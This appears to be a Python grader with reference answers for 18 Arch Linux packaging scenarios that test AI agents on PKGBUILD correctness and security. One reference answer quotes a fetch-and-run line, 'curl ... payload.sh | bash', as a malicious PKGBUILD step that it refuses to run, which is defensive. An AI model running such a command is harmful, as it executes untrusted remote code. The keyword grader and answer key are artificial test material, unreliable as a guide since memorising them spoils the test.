#!/usr/bin/env python3
"""
Arch Packaging Evaluation Engine
Part of Syswright

Deterministic evaluation suite that verifies AI agent responses, PKGBUILDs,
and packaging recommendations against authoritative Arch Linux packaging
standards, security policies, and devtools workflows.
"""

import json
import re
import sys
from pathlib import Path
from typing import Any, Dict, List, Tuple


def evaluate_arch_packaging_scenario(scenario: Dict[str, Any], response_text: str) -> Tuple[bool, str]:
    """
    Evaluates whether an engineering response satisfies the criteria for
    a specific Arch packaging evaluation scenario.
    """
    resp_lower = response_text.lower()
    sid = scenario["id"]
    eval_type = scenario["eval_type"]

    if eval_type == "cmake_rules":
        required = [
            "-dcmake_build_type=none",
            "-dcmake_install_prefix=/usr",
            "ninja",
            "destdir=\"$pkgdir\" cmake --install",
        ]
        forbidden = [
            "-dcmake_build_type=release",
            "/usr/local",
            "$startdir",
        ]
        for f in forbidden:
            if f in resp_lower:
                return False, f"Response contains forbidden pattern: '{f}'"
        for r in required:
            if r not in resp_lower:
                return False, f"Missing required CMake packaging rule: '{r}'"
        return True, "Compliant CMake PKGBUILD: verified flags, Ninja, and staging path"

    elif eval_type == "cargo_rules":
        required = [
            "cargo fetch",
            "--frozen",
            "--release",
            "install -dm755",
            "makedepends=('cargo')",
        ]
        # In resp_lower, normalized
        if "cargo fetch" not in resp_lower or "--locked" not in resp_lower:
            return False, "Missing pre-fetch step in prepare(): cargo fetch --locked"
        if "--frozen" not in resp_lower or "--release" not in resp_lower:
            return False, "cargo build must use --frozen and --release"
        if "install -dm755" not in resp_lower:
            return False, "Binary must be installed with install -Dm755"
        if "makedepends=('cargo')" not in resp_lower and "'cargo'" not in resp_lower:
            return False, "makedepends must include cargo"
        return True, "Compliant Cargo PKGBUILD: verified offline flags, fetch, and installation"

    elif eval_type == "review_audit":
        expected_flags = [
            ("underscore", ["underscore", "pkgname"]),
            ("hyphen in pkgver", ["hyphen", "pkgver"]),
            ("arch any for elf", ["arch=('any')", "any", "native", "elf"]),
            ("deprecated md5", ["md5", "sha256", "deprecated"]),
            ("/usr/local violation", ["/usr/local", "fhs", "/usr/bin"]),
            ("world writable", ["777", "permissions", "world-writable", "0755"]),
        ]
        for label, keywords in expected_flags:
            if not any(k in resp_lower for k in keywords):
                return False, f"Failed to flag expected violation: {label}"
        return True, "Audit passed: successfully flagged all 6 packaging anti-patterns"

    elif eval_type == "dependency_classification":
        if "makedepends" not in resp_lower:
            return False, "Failed to identify that build tools belong in makedepends"
        for tool in ["cmake", "ninja", "gcc"]:
            if tool not in resp_lower:
                return False, f"Failed to reclassify '{tool}'"
        if "libxml2" not in resp_lower:
            return False, "Failed to detect missing runtime dependency 'libxml2'"
        return True, "Correctly reclassified build dependencies and identified missing runtime library"

    elif eval_type == "diagnose_missing_makedepends":
        if "meson" not in resp_lower or "zlib" not in resp_lower:
            return False, "Failed to identify both meson and zlib as missing dependencies"
        if "makedepends" not in resp_lower:
            return False, "Failed to prescribe adding missing items to makedepends"
        return True, "Correctly diagnosed missing tool and header package for clean chroot"

    elif eval_type == "arch_audit":
        if "any" not in resp_lower or ("x86_64" not in resp_lower and "architecture-dependent" not in resp_lower):
            return False, "Failed to reject arch=('any') or prescribe arch=('x86_64')"
        if "elf" not in resp_lower and "compiled" not in resp_lower and "machine" not in resp_lower:
            return False, "Failed to cite technical rationale (ELF binaries are architecture-dependent)"
        return True, "Correctly rejected arch=('any') and cited ELF architecture dependency"

    elif eval_type == "checksum_integrity":
        if "skip" in resp_lower and ("refuse" in resp_lower or "forbidden" in resp_lower or "never" in resp_lower or "not" in resp_lower):
            if "sha256" in resp_lower or "retag" in resp_lower or "verify" in resp_lower:
                return True, "Correctly refused SKIP on release archive and demanded verified checksum"
        return False, "Failed to enforce refusal of SKIP on release archive"

    elif eval_type == "pgp_security":
        if any(w in resp_lower for w in ["blind", "unverified", "vulnerability", "risk", "refuse"]):
            if "40" in resp_lower or "fingerprint" in resp_lower:
                if "validpgpkeys" in resp_lower or "out-of-band" in resp_lower:
                    return True, "Correctly flagged blind key import, required 40-char fingerprint, and out-of-band verification"
        return False, "Failed to identify unsafe blind PGP key import"

    elif eval_type == "chroot_diagnosis":
        if any(w in resp_lower for w in ["leakage", "workstation", "ambient", "contamination", "host"]):
            if "clean" in resp_lower or "chroot" in resp_lower:
                if "curl" in resp_lower and "makedepends" in resp_lower:
                    return True, "Correctly diagnosed workstation contamination and added missing makedepends"
        return False, "Failed to diagnose host dependency leakage vs clean chroot isolation"

    elif eval_type == "aur_preparation":
        if ".srcinfo" in resp_lower and "makepkg --printsrcinfo" in resp_lower:
            if "exclude" in resp_lower or "reject" in resp_lower or "not commit" in resp_lower:
                if ".pkg.tar.zst" in resp_lower or "binary" in resp_lower:
                    return True, "Correctly generated .SRCINFO, excluded binary packages, and enforced AUR rules"
        return False, "Failed to enforce AUR .SRCINFO and binary archive exclusion rules"

    elif eval_type == "aur_duplicate_check":
        if "extra/ripgrep" in resp_lower or ("official" in resp_lower and "ripgrep" in resp_lower):
            if any(w in resp_lower for w in ["refuse", "forbidden", "do not submit", "duplicate", "already exists"]):
                if any(w in resp_lower for w in ["flag", "out-of-date", "bug report"]):
                    return True, "Correctly detected official package, refused duplicate submission, and recommended upstream flagging"
        return False, "Failed to detect existing official package and enforce anti-duplication rule"

    elif eval_type == "version_update":
        if "1.5.0" in resp_lower:
            if "pkgrel=1" in resp_lower or "reset" in resp_lower:
                if "drop" in resp_lower or "remove" in resp_lower:
                    if "upgpkg:" in resp_lower or "commit" in resp_lower:
                        return True, "Correctly updated version, reset pkgrel to 1, dropped merged patch, and formatted commit"
        return False, "Failed to execute complete version update workflow"

    elif eval_type == "fhs_audit":
        if "/usr/local" in resp_lower and ("/usr/bin" in resp_lower or "fhs" in resp_lower):
            if "/etc/systemd/system" in resp_lower and ("/usr/lib/systemd/system" in resp_lower or "override" in resp_lower):
                return True, "Correctly flagged /usr/local and /etc/systemd/system FHS violations"
        return False, "Failed to audit filesystem paths against Arch FHS standards"

    elif eval_type == "bundled_library_policy":
        if any(w in resp_lower for w in ["bundled", "vendor", "unbundle", "policy"]):
            if "system" in resp_lower and ("sqlite" in resp_lower or "zlib" in resp_lower):
                if "depends" in resp_lower:
                    return True, "Correctly enforced Arch policy against bundled libraries and linked system dependencies"
        return False, "Failed to enforce policy against bundled/vendored libraries"

    elif eval_type == "untrusted_execution_guard":
        if any(w in resp_lower for w in ["refuse", "do not execute", "never run", "untrusted"]):
            if "curl" in resp_lower or "pipe" in resp_lower or "bash" in resp_lower:
                if any(w in resp_lower for w in ["static", "sandbox", "isolated", "container"]):
                    return True, "Correctly refused execution of untrusted PKGBUILD and enforced static/sandbox audit"
        return False, "Failed to guard host against untrusted PKGBUILD script execution"

    elif eval_type == "no_gratuitous_churn":
        if any(w in resp_lower for w in ["decline", "unnecessary", "preserve", "churn", "no-op", "working"]):
            return True, "Correctly declined gratuitous churn on working, verified PKGBUILD"
        return False, "Failed to avoid unnecessary modifications on working package"

    elif eval_type == "custom_repo_management":
        if "repo-add" in resp_lower:
            if "--sign" in resp_lower and "--verify" in resp_lower:
                if "siglevel" in resp_lower or "pacman.conf" in resp_lower:
                    return True, "Correctly configured repo-add with signing/verification and documented pacman.conf"
        return False, "Failed to implement production-quality signed repository workflow"

    elif eval_type == "reproducibility_diagnosis":
        if "source_date_epoch" in resp_lower or "timestamp" in resp_lower:
            if "-ffile-prefix-map" in resp_lower or "path" in resp_lower or "-trimpath" in resp_lower:
                if "makerepropkg" in resp_lower or "diffoscope" in resp_lower:
                    return True, "Correctly diagnosed timestamp and debug path non-determinism via makerepropkg and diffoscope"
        return False, "Failed to diagnose reproducibility failures and prescribe standard mitigations"

    return False, f"Unknown eval_type: {eval_type}"


def run_arch_packaging_evals(scenarios_path: Path, sample_responses: Dict[str, str]) -> Tuple[int, int, List[str]]:
    """
    Run all Arch packaging evaluation scenarios against provided sample responses.
    Returns (passed_count, total_count, log_messages).
    """
    with scenarios_path.open("r", encoding="utf-8") as f:
        scenarios = json.load(f)

    passed = 0
    total = len(scenarios)
    logs = []

    for sc in scenarios:
        sid = sc["id"]
        sname = sc["name"]
        resp = sample_responses.get(sid, "")

        if not resp:
            logs.append(f"[FAIL] {sid} ({sname}): No candidate response provided")
            continue

        ok, msg = evaluate_arch_packaging_scenario(sc, resp)
        if ok:
            passed += 1
            logs.append(f"[PASS] {sid} ({sname}): {msg}")
        else:
            logs.append(f"[FAIL] {sid} ({sname}): {msg}")

    return passed, total, logs


def get_reference_eval_responses() -> Dict[str, str]:
    """
    Returns reference gold-standard engineering responses for each of the 18
    evaluation scenarios demonstrating 100% compliance with Arch packaging standards.
    """
    return {
        "eval_01_cmake_package": """
pkgname=libfastcalc
pkgver=2.4.0
pkgrel=1
pkgdesc="High-performance calculation library"
arch=('x86_64')
url="https://github.com/fastcalc/fastcalc"
license=('Apache-2.0')
depends=('glibc' 'gcc-libs')
makedepends=('cmake' 'ninja')
source=("$pkgname-$pkgver.tar.gz::$url/archive/v$pkgver.tar.gz")
sha256sums=('a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2')

build() {
  cmake -B build -S "$pkgname-$pkgver" \
    -G Ninja \
    -DCMAKE_BUILD_TYPE=None \
    -DCMAKE_INSTALL_PREFIX=/usr \
    -DCMAKE_INSTALL_LIBDIR=lib \
    -Wno-dev
  cmake --build build
}

check() {
  ctest --test-dir build --output-on-failure
}

package() {
  DESTDIR="$pkgdir" cmake --install build
}
""",
        "eval_02_rust_cargo_package": """
pkgname=oxisearch
pkgver=0.8.2
pkgrel=1
pkgdesc="Fast code search tool in Rust"
arch=('x86_64')
url="https://github.com/oxisearch/oxisearch"
license=('MIT')
depends=('glibc')
makedepends=('cargo')
source=("$pkgname-$pkgver.tar.gz::$url/archive/v$pkgver.tar.gz")
sha256sums=('b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3')

prepare() {
  cd "$pkgname-$pkgver"
  cargo fetch --locked --target "$(rustc -vV | sed -n 's/host: //p')"
}

build() {
  cd "$pkgname-$pkgver"
  export RUSTUP_TOOLCHAIN=stable
  export CARGO_TARGET_DIR=target
  cargo build --frozen --release --all-features
}

check() {
  cd "$pkgname-$pkgver"
  cargo test --frozen --all-features
}

package() {
  cd "$pkgname-$pkgver"
  install -Dm755 "target/release/$pkgname" "$pkgdir/usr/bin/$pkgname"
  install -Dm644 LICENSE "$pkgdir/usr/share/licenses/$pkgname/LICENSE"
}
""",
        "eval_03_review_incorrect_pkgbuild": """
Review of Submitted PKGBUILD:
1. pkgname violation: 'broken_pkg' contains an underscore; Arch package names must use only lowercase alphanumeric characters and hyphens.
2. pkgver violation: '1.0-beta' contains a hyphen; hyphens are reserved for separating pkgver and pkgrel. It must be converted to '1.0_beta'.
3. arch=('any') violation: The package compiles native ELF code; architecture must be 'x86_64', not 'any'.
4. Deprecated md5sums: MD5 is cryptographically insecure and deprecated in Arch packaging; replace with sha256sums or b2sums.
5. FHS violation: Package installs into '/usr/local/bin'; packages must install into '/usr/bin'.
6. World-writable permissions: Setting chmod 777 on installed binaries is a critical security vulnerability; permissions must be 0755.
""",
        "eval_04_detect_incorrect_runtime_dep": """
Dependency Reclassification Analysis:
1. 'cmake', 'ninja', and 'gcc' are build-time tools and compilers needed only during compilation. They must be moved from depends to makedepends.
2. ELF dynamic analysis (readelf -d) on the compiled binary reveals DT_NEEDED entries for 'libc.so.6' (provided by glibc) and 'libxml2.so.2' (provided by libxml2).
3. 'libxml2' is directly linked at runtime and was missing from depends; add 'libxml2' to depends.
Final depends: ('glibc' 'libxml2')
Final makedepends: ('cmake' 'ninja' 'gcc')
""",
        "eval_05_detect_missing_makedepends": """
Diagnosis of Clean-Chroot Build Failure:
1. 'meson: command not found': The build tool meson is missing from the minimal buildroot; add 'meson' to makedepends.
2. 'fatal error: zlib.h: No such file or directory': The compiler cannot locate zlib C development headers. Running 'pacman -F zlib.h' confirms usr/include/zlib.h is provided by the 'zlib' package.
Action: Add 'meson' and 'zlib' to makedepends in the PKGBUILD.
""",
        "eval_06_detect_incorrect_arch": """
Architecture Audit:
The package compiles native C source code into an executable ELF binary. Machine instructions in ELF binaries are architecture-dependent. Arch Linux guidelines strictly mandate that arch=('any') is reserved for architecture-independent packages (pure Python, shell scripts, fonts). Compiled native ELF packages must declare arch=('x86_64').
Correction: Change arch=('any') to arch=('x86_64').
""",
        "eval_07_detect_invalid_checksum": """
Refusal of SKIP Checksum:
We strictly refuse to replace the checksum with sha256sums=('SKIP'). Using SKIP on static release archives disables cryptographic integrity verification and exposes users to supply-chain attacks.
Investigation:
1. Check whether upstream retagged the release or regenerated the tarball with different compression.
2. Check upstream signed release announcements or git commit history to verify the authentic tarball.
3. Compute the sha256sum of the verified authentic tarball and update sha256sums in the PKGBUILD.
""",
        "eval_08_unsafe_pgp_key_handling": """
Security Review of PGP Key Import:
Running 'gpg --recv-keys 44869609740AE61A' blindly is a severe supply-chain risk. Public keyservers do not verify identity; anyone can upload a key with an arbitrary user ID or colliding 16-character short key ID.
Required Security Procedure:
1. Obtain the full 40-character hexadecimal fingerprint from independent, verified upstream channels (e.g. developer's official web page, signed git tags).
2. Add the verified 40-character fingerprint to the validpgpkeys array in PKGBUILD.
3. Only after out-of-band verification, import the verified key into the maintainer keyring.
""",
        "eval_09_dirty_vs_clean_chroot": """
Workstation vs Clean-Chroot Discrepancy Diagnosis:
The local makepkg build succeeded only because the developer's workstation had curl development headers installed ambiently from previous development work. The clean chroot (pkgctl build --clean) exposes the actual packaging defect because it installs strictly declared dependencies in an ephemeral, pristine environment.
Remediation:
The clean chroot outcome is authoritative. Add 'curl' to makedepends in the PKGBUILD to resolve the missing header error.
""",
        "eval_10_prepare_aur_package": """
AUR Package Preparation:
1. Regenerate metadata: Run 'makepkg --printsrcinfo > .SRCINFO' to ensure synchronization.
2. Audit Git tree: Strictly exclude the compiled binary archive (custom-cli-tool-1.0.0-1-x86_64.pkg.tar.zst) and the downloaded source tarball (v1.0.0.tar.gz). The AUR repository must only contain PKGBUILD, .SRCINFO, and local patches.
3. Push Gating: Require explicit human approval before running 'git push origin master' to the AUR.
""",
        "eval_11_detect_existing_official_package": """
AUR Duplicate Check:
Querying official repositories reveals that 'extra/ripgrep' is already actively maintained as an official Arch Linux binary package.
AUR Submission Policy:
The AUR submission guidelines strictly forbid building or submitting applications already present in official binary repositories. Submitting a duplicate package will result in immediate deletion.
Proper Procedure: If the official package is outdated, flag it out-of-date on archlinux.org/packages; if it has a bug, file a report on gitlab.archlinux.org/archlinux/packaging/packages.
""",
        "eval_12_update_package_version": """
Upstream Version Update Procedure:
1. Set pkgver=1.5.0.
2. Reset pkgrel=1 (mandatory: release count always resets to 1 upon version bump).
3. Upstream changelog confirms 0001-fix-gcc14.patch was merged upstream in 1.5.0; drop the patch from source array and remove the patch file.
4. Regenerate checksums using updpkgsums.
5. Rebuild in clean chroot and format conventional commit: 'upgpkg: libfoo 1.5.0-1: upstream release'.
""",
        "eval_13_detect_incorrect_filesystem_path": """
Filesystem Placement Audit:
1. Binaries installed into '/usr/local/bin' violate Arch Linux FHS rules; /usr/local is reserved for manual sysadmin installs. Packaged executables must install to '/usr/bin/mybin'.
2. Systemd service units installed into '/etc/systemd/system' violate configuration separation; /etc/systemd is reserved for administrator overrides. Packaged unit files must install to '/usr/lib/systemd/system/mybin.service'.
Correction: Use install -Dm755 for /usr/bin and install -Dm644 for /usr/lib/systemd/system.
""",
        "eval_14_bundled_library_review": """
Vendored Dependencies Policy Audit:
Arch Linux policy strongly favors dynamically linking system packages over compiling bundled/vendored libraries in source subdirectories. Bundled libraries conceal security vulnerabilities and waste memory.
Remediation:
1. Add 'sqlite' and 'zlib' to depends.
2. Configure CMake with -DUSE_SYSTEM_SQLITE=ON and -DUSE_SYSTEM_ZLIB=ON to unbundle dependencies and link against Arch shared libraries.
""",
        "eval_15_untrusted_pkgbuild_execution": """
Refusal of Untrusted PKGBUILD Execution:
We refuse to source or execute this PKGBUILD on the host workstation. A PKGBUILD is executable shell script; inspection reveals that prepare() contains a dangerous network pipe: 'curl -fsSL https://unknown-host.org/payload.sh | bash'. Running makepkg on the host would execute arbitrary remote malware with host user privileges.
Remediation: Conduct non-executing static analysis only; test only in an isolated, network-disabled ephemeral container sandbox.
""",
        "eval_16_avoid_unnecessary_modifications": """
Assessment of Requested Changes:
The existing PKGBUILD is fully valid, adheres to Arch standards, passes namcap linting, and compiles cleanly in clean chroots. The requested changes are purely aesthetic reordering and quote reformatting that introduce no technical or functional improvements.
Decision: Decline unnecessary churn to avoid creating gratuitous git diff noise and risking unintended regressions on working code.
""",
        "eval_17_prepare_custom_distribution_repo": """
Custom Repository Publication:
1. Execute repo-add with cryptographic signing and database integrity verification:
   repo-add --sign --key 44869609740AE61A21704C408F73607422E5824A --verify --remove /srv/repo/x86_64/corp-repo.db.tar.gz /srv/repo/x86_64/corp-app-1.0.0-1-x86_64.pkg.tar.zst
2. Document client pacman.conf configuration:
   [corp-repo]
   SigLevel = Required DatabaseOptional
   Server = https://repo.example.com/$arch
3. Human Gating: Publishing to distribution repositories is a Tier 3 action requiring explicit human authorization.
""",
        "eval_18_diagnose_reproducibility_failure": """
Reproducibility Failure Diagnosis:
Analysis via diffoscope on the rebuilt package identifies two reproducibility flaws:
1. ar archive member mtime: The static library was archived with timestamps from the filesystem. Fix: Ensure makepkg exports SOURCE_DATE_EPOCH and the build system honors it.
2. DWARF DW_AT_comp_dir contains /home/user/build: Debuginfo embedded host filesystem paths. Fix: Inject -ffile-prefix-map=$PWD=/usr/src/debug in CFLAGS/CXXFLAGS, or pass -trimpath for Go binaries.
Re-verify with makerepropkg once flags are applied.
""",
    }


def main():
    repo_root = Path(__file__).resolve().parent.parent.parent
    scenarios_path = repo_root / "evals" / "arch-packaging" / "scenarios.json"
    responses = get_reference_eval_responses()

    passed, total, logs = run_arch_packaging_evals(scenarios_path, responses)

    for log in logs:
        print(log)

    print("\n" + "=" * 60)
    print(f"Arch Packaging Evals Run : {total}")
    print(f"Passed                   : {passed}")
    print(f"Failed                   : {total - passed}")
    print(f"Accuracy Rate            : {(passed / total) * 100:.1f}%")
    print("=" * 60)

    if passed == total:
        print("OVERALL VERDICT: PASS (All 18 scenarios passed cleanly)")
        sys.exit(0)
    else:
        print("OVERALL VERDICT: FAIL")
        sys.exit(1)


if __name__ == "__main__":
    main()
